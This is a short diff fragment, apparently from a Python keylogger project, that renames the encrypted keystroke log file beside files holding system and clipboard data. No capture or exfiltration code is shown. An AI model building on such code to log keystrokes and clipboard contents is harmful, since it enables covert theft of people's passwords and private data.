@@ -4,7 +4,7 @@ key =" "   #paste the generated key here
 
 system_information_e = "e_system.txt"
 clipboard_information_e = "e_clipboard.txt"
-keys_information_e = "e_keys_logged.txt"
+keys_information_e = "e_key_log.txt"
 
 encrypted_files = [system_information_e, clipboard_information_e,keys_information_e]
 count = 0
